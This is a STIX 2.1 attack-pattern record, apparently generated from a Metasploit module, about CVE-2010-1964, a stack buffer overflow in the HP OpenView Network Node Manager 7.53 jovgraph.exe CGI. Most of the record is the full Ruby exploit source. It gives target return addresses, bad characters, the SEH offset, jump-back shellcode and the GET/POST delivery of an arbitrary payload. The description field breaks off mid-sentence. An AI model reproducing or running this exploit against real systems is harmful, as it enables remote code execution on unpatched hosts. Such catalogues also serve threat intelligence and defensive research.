{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--21c2ae27-6205-477d-9950-d2b4723df970",
    "created": "2024-08-14T16:55:30.900279Z",
    "modified": "2024-08-14T16:55:30.900283Z",
    "name": "HP OpenView Network Node Manager ovwebsnmpsrv.exe main Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53 prior to NNM_01203. By specifying a long 'arg' parameter when executing the 'jovgraph.exe' CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code.  This vulnerability is triggerable via either a GET or POST request. The buffer being written to is 1024 bytes in size. It is important to note that this vulnerability must",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_nnm_ovwebsnmpsrv_main.rb",
            "external_id": "hp_nnm_ovwebsnmpsrv_main.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1964"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  HttpFingerPrint = { :method => 'HEAD', :uri => '/OvCgi/jovgraph.exe', :pattern => /Hewlett-Packard Development Company/ }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP OpenView Network Node Manager ovwebsnmpsrv.exe main Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53\n        prior to NNM_01203. By specifying a long 'arg' parameter when executing the 'jovgraph.exe'\n        CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code.\n\n        This vulnerability is triggerable via either a GET or POST request. The buffer being\n        written to is 1024 bytes in size. It is important to note that this vulnerability must\n        be exploited by overwriting SEH. Otherwise, CVE-2010-1961 is triggered!\n\n        The vulnerable code is within the \"main\" function within \"ovwebsnmpsrv.exe\" with a\n        timestamp prior to April 7th, 2010. There are no stack cookies, so exploitation is\n        easily achieved by overwriting SEH structures.\n\n        There exists some unreliability when running this exploit. It is not completely clear why\n        at this time, but may be related to OVWDB or session management. Also, on some attempts\n        OV NNM may report invalid characters in the URL. It is not clear what is causing this\n        either.\n      } ,\n      'Author'         =>\n        [\n          'jduck'   # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-1964' ],\n          [ 'OSVDB', '65552' ],\n          [ 'BID', '40873' ],\n          [ 'ZDI', '10-108' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 1024, # 1024 byte buffer..\n          # In addition to regular HTTP type bad chars, this one also has\n          # an issue with \" since the buffer is being passed on the command line.\n          'BadChars' => \"\\x00\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\x22\\x24\\x2c\\x3b\\x60\",\n          'DisableNops' => true,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'HP OpenView Network Node Manager 7.53 w/NNM_01201',\n            {\n              'Ret'     => 0x5a02aadf, # pop edx/pop ebp/ret - in ov.dll (v1.30.10.9166)\n            }\n          ],\n          [ 'HP OpenView Network Node Manager 7.53 (Windows 2003)',\n            {\n              'Ret'     => 0x71c069dd, # pop edx/pop ecx/ret - in ws2_32.dll v5.2.3790.3959\n            }\n          ],\n          [ 'Debug Target',\n            {\n              'Ret'     => 0xdeadbeef, # crasher\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-06-16'))\n  end\n\n  def exploit\n\n    print_status(\"Trying target #{target.name}...\")\n\n    cgi = '/OvCgi/jovgraph.exe'\n\n    # Any command line parameter will cause a buffer overflow.\n\n    # \"action\" must be set\n    action = rand_text_alphanumeric(1)\n\n    # \"sel\" must be set\n    sel = rand_text_alphanumeric(1)\n\n    # \"timestamp\" cannot be set.\n\n    # SEH\n    seh_offset = 1132\n    seh_frame = generate_seh_record(target.ret)\n\n    # Jump back to the payload, after p/p/r jumps to us.\n    distance = seh_offset + seh_frame.length\n    distance -= 1  # skip the first byte (cannot be -/+)\n    jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n\n    # Create the buffer\n    buf = ''\n    # The first character cannot be a - or a +\n    buf << rand_text(1, payload_badchars + \"+-\")\n    buf << payload.encoded\n    buf << rand_text(seh_offset - buf.length)\n    buf << seh_frame\n    buf << jmp_back\n\n    # Force an exception writing off the end of the stack\n    buf << rand_text(6500 - buf.length)\n\n    # Send the request\n    if rand(2) > 0\n      print_status(\"Sending exploit via POST request...\")\n      res = send_request_cgi({\n        'uri'\t\t  => cgi,\n        'method'\t  => \"POST\",\n        'vars_post' =>\n          {\n            'sel' => sel,\n            'act' => action,\n            'arg' => buf\n          }\n      }, 3)\n    else\n      print_status(\"Sending exploit via GET request...\")\n      res = send_request_cgi({\n        'uri'\t\t  => cgi,\n        'method'\t  => \"GET\",\n        'vars_get' =>\n          {\n            'sel' => sel,\n            'act' => action,\n            'arg' => buf\n          }\n      }, 3)\n    end\n\n    if not res\n      fail_with(Failure::Unknown, \"Eek! We didn't get a response.. Exploiting this vuln should return one!\")\n    end\n\n    print_status(res.body) if datastore[\"NNM_DEBUG\"]\n\n    if res.body =~ /graphing applet is being/\n      print_status(\"We got the body we were looking for, the session should be coming any second.\")\n    else\n      fail_with(Failure::Unknown, \"Eek, exploit likely failed. The body didn't contain what we expected.\")\n    end\n\n    handler\n\n  end\n\n  def wfs_delay\n    5\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2010-06-16",
    "x_mitre_platforms": [
        "win'"
    ]
}